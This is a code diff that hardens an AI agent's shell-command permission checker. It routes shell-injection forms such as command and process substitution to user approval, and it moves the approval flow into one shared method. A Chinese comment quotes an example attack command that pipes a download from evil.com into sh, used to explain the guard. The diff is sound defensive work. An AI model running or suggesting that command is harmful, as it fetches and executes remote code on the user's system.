@@ -24,6 +24,7 @@ from pathlib import Path
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
 from agent.atomic_io import atomic_write_text
+from agent.bash_injection import check_injection_surface
 
 
 # ---------------------------------------------------------------------------
@@ -185,7 +186,9 @@ _SAFE_FS_VERBS = {"mkdir", "touch", "mv", "cp", "rm", "del"}
 # shell 复合操作符守卫：复合命令风险高，acceptEdits 不自动批
 # （例：``rm tmp && curl evil.com | sh`` 的 verb="rm" ∈ SAFE_FS，但 curl 部分
 # 会被 shell 执行）。这种命令必须交原审批闸门。
-_SHELL_OPS = ("&&", "||", ";", "|", "`", "$(")
+# R16 #1 追加：${ / <( / >( / =(（注入面形态——rm ${X} 的展开目标不受
+# cwd 内路径校验控制，进程替换直接执行子 shell），acceptEdits 不自动批。
+_SHELL_OPS = ("&&", "||", ";", "|", "`", "$(", "${", "<(", ">(", "=(")
 
 
 def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
@@ -1047,6 +1050,76 @@ class PermissionChecker:
         except Exception as e:
             logger.debug("保存路径白名单失败: %s", e)
 
+    def _approval_gate(
+        self,
+        command: str,
+        effective_mode: str,
+        *,
+        hook_reason: str,
+        auto_deny_reason: str,
+        no_callback_message: str,
+        gate: str,
+    ) -> PermissionResult:
+        """统一审批闸门（R16 #1 抽取；破坏性命令与注入面形态共用）。
+
+        流程与原破坏性审批块逐行等价：
+        持久化白名单/会话缓存命中放行 → autoDeny 短路拒（async 子代理
+        不能弹审批 UI）→ 无 callback 拒 → PERMISSION_REQUEST hook + toast →
+        callback 审批 → 拒绝/批准（批准入会话缓存 + 持久化白名单）。
+        """
+        cmd_key = command.strip()
+
+        # 先检查持久化白名单 + 会话缓存
+        if cmd_key in self._persistent_whitelist or cmd_key in self._approved:
+            return PermissionResult(True, "已批准（白名单）", "approval")
+
+        # auto_deny 短路（fail-closed）：
+        # - fatal 底线（rm -rf / 等）已在闸门 0 拒绝，不会走到这里
+        # - 黑名单（sudo 等）已在闸门 1 拒绝，不会走到这里
+        # - 必须用 effective_mode——singleton checker（get_default_checker()
+        #   返回的共享实例）的 self.mode 永远是 "default"，子代理的 autoDeny
+        #   通过 mode_override 传入，只有 effective_mode 能反映真实模式。
+        if effective_mode == "autoDeny":
+            return self._deny(
+                command,
+                f"auto-denied: async 子代理不能弹审批 UI（{auto_deny_reason}）",
+                "auto_deny",
+            )
+
+        if self.approval_callback is None:
+            return self._deny(command, no_callback_message, gate)
+
+        # PERMISSION_REQUEST 审计（进入用户审批前；fail-open）
+        if self._hooks_registry is not None:
+            try:
+                self._hooks_registry.run_permission_request({
+                    "command": command,
+                    "reason": hook_reason,
+                })
+            except Exception:
+                pass  # fail-open
+
+        # 桌面通知——用户可能没盯屏幕，弹 toast 提醒审批（fail-open）
+        try:
+            from agent.notifier import notify as _notify
+            _notify("需要审批", "agent 请求执行命令")
+        except Exception:
+            pass
+
+        try:
+            approved = bool(self.approval_callback(command))
+        except Exception:
+            approved = False
+
+        if not approved:
+            return self._deny(command, "用户拒绝", "approval")
+
+        # 批准：加入会话缓存 + 持久化白名单
+        self._approved.add(cmd_key)
+        self._persistent_whitelist.add(cmd_key)
+        self._save_whitelist()
+        return PermissionResult(True, "已批准", "approval")
+
     def check(
         self,
         command: str,
@@ -1096,6 +1169,21 @@ class PermissionChecker:
         if deny:
             return self._deny(command, f"硬拒绝: {deny}", "deny")
 
+        # === R16 #1：注入面模式（命中 → 升审批，不硬拒）===
+        # $()/${}/进程替换/zsh 展开/IFS/控制字符等"所见非所执行"形态，
+        # 对齐 CCB bashSecurity 的 ask 语义（模块头有与 CC 的差异说明）。
+        # 必须先于只读快速通道：ls <(evil) 不能被只读通道自动放行。
+        injection = check_injection_surface(command)
+        if injection:
+            return self._approval_gate(
+                command,
+                effective_mode,
+                hook_reason=f"注入面: {injection}",
+                auto_deny_reason=f"注入面: {injection}",
+                no_callback_message=f"命令含注入面形态需用户确认: {injection}",
+                gate="injection",
+            )
+
         # === T7：只读快速通道（自动批，在破坏性审批与 LLM 分类器之前）===
         # git status/ls/cat 等只读命令零打扰放行（也跳过闸门 4 的 LLM 调用）。
         # 顺序在闸门 1 之后：黑名单永远先于快速通道（fatal 底线更早在闸门 0）。
@@ -1104,75 +1192,17 @@ class PermissionChecker:
             if _is_readonly_command(command):
                 return PermissionResult(True, "只读快速通道（readonly fastpath）", "auto")
 
-        # 闸门 2：破坏性命令（需要审批）
+        # 闸门 2：破坏性命令（需要审批；R16 #1 起与注入面共用 _approval_gate）
         destructive = check_destructive(command)
         if destructive:
-            cmd_key = command.strip()
-
-            # 先检查持久化白名单 + 会话缓存
-            if cmd_key in self._persistent_whitelist or cmd_key in self._approved:
-                return PermissionResult(True, "已批准（白名单）", "approval")
-
-            # === Task J NEW: auto_deny 短路 ===
-            # async 子代理（background=True）不能弹审批 UI（用户不在场），
-            # 所有需 user approval 的破坏性命令直接 permission_denied（fail-closed）。
-            # 借鉴 Claude Code `shouldAvoidPermissionPrompts: true`。
-            # 注意：
-            # - fatal 底线（rm -rf / 等）已在闸门 0 拒绝，不会走到这里
-            # - 黑名单（sudo 等）已在闸门 1 拒绝，不会走到这里
-            # - 已批准命令（白名单缓存）已在上面的 if 放行
-            # - safe-fs 在 cwd 内（acceptEdits 模式）已在上面 acceptEdits 分支放行，
-            #   auto_deny 模式不走 acceptEdits，safe-fs 路径不触发
-            #
-            # Task J review fix：必须用 effective_mode（来自 mode_override 或 self.mode），
-            # 不能用 self.auto_deny 实例字段——singleton checker（get_default_checker()
-            # 返回的共享实例）的 self.mode 永远是 "default"，子代理的 autoDeny 通过
-            # mode_override 传入，只有 effective_mode 能反映本次调用的真实模式。
-            if effective_mode == "autoDeny":
-                return self._deny(
-                    command,
-                    f"auto-denied: async 子代理不能弹审批 UI（破坏性命令: {destructive}）",
-                    "auto_deny",
-                )
-
-            if self.approval_callback is None:
-                return self._deny(
-                    command,
-                    f"破坏性命令需用户确认: {destructive}",
-                    "destructive",
-                )
-
-            # round3 D2 NEW: PERMISSION_REQUEST 审计（进入用户审批前）
-            if self._hooks_registry is not None:
-                try:
-                    self._hooks_registry.run_permission_request({
-                        "command": command,
-                        "reason": destructive,
-                    })
-                except Exception:
-                    pass  # fail-open
-
-            # CCAR11 Task 6 NEW: 桌面通知——用户可能没盯屏幕，弹 toast 提醒审批
-            # fail-open：notify 异常不影响审批流程
-            try:
-                from agent.notifier import notify as _notify
-                _notify("需要审批", "agent 请求执行命令")
-            except Exception:
-                pass
-
-            try:
-                approved = bool(self.approval_callback(command))
-            except Exception:
-                approved = False
-
-            if not approved:
-                return self._deny(command, "用户拒绝", "approval")
-
-            # 批准：加入会话缓存 + 持久化白名单
-            self._approved.add(cmd_key)
-            self._persistent_whitelist.add(cmd_key)
-            self._save_whitelist()
-            return PermissionResult(True, "已批准", "approval")
+            return self._approval_gate(
+                command,
+                effective_mode,
+                hook_reason=destructive,
+                auto_deny_reason=f"破坏性命令: {destructive}",
+                no_callback_message=f"破坏性命令需用户确认: {destructive}",
+                gate="destructive",
+            )
 
         # 闸门 4：aux_llm 分类（feature flag 门控，默认 OFF）
         # 前三道闸门都没拒绝也没要求审批的命令（非黑名单、非破坏性），
